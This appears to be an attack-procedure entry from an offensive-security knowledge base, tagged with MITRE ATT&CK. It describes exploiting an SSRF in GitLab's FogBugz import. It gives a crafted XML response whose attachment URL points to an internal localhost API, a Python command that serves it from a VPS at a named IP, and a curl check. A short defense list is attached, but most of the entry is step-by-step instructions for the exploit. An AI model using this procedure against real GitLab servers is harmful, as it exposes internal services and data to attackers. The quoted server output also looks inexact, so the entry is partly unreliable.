---
id: proc-host-malicious-response
tags:
  - ssrf
  - api
  - fogbugz
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:09.236Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host Malicious FogBugz API Response

## Summary

This procedure involves setting up an HTTP server on a controlled VPS to serve a simulated FogBugz API response containing an attachment URL that triggers SSRF to localhost services during GitLab import.

## Description

The VPS responds to requests for poc.fogbugz.com with XML/JSON mimicking FogBugz data, embedding an attachment URL like http://127.0.0.1:9090/api/v1/targets. When GitLab imports over HTTP, CarrierWave's download! calls Kernel.open, following the URL to internal services and storing the response in the issue.

## Requirements

1. VPS with IP 198.211.125.160 and HTTP server (e.g., Python or nginx)
2. Crafted response file with malicious attachment URL
3. Port 80 open on VPS

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all imported attachment URLs beyond domain checks
- Disable HTTP imports or enforce HTTPS
- Log and monitor outbound requests from import services

## Objectives

1. Simulate FogBugz API with SSRF payload
2. Ensure response includes arbitrary localhost URL
3. Prepare for GitLab fetch during import

## Instructions

### Step 1: Prepare Response File

**Context**: Create a file (e.g., response.xml) with FogBugz-like structure including the malicious attachment.

**Instructions**: Edit a file to include:
```xml
<response><attachments><attachment url="http://127.0.0.1:9090/api/v1/targets"/></attachments></response>
```
Save as /var/www/response.xml on VPS.

### Step 2: Start HTTP Server

**Context**: Host the response on port 80.

**Command** (Python server):
```bash
cd /var/www && python3 -m http.server 80
```

> Serves files from directory; expected output: Server listening on 0.0.0.0:80. Access via curl http://198.211.125.160/response.xml to verify.

### Step 3: Test Response

**Context**: Confirm the malicious URL is served.

**Command** (curl):
```bash
curl http://198.211.125.160/response.xml
```

> Returns the XML with attachment URL; success if localhost URL is present.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- api
- fogbugz
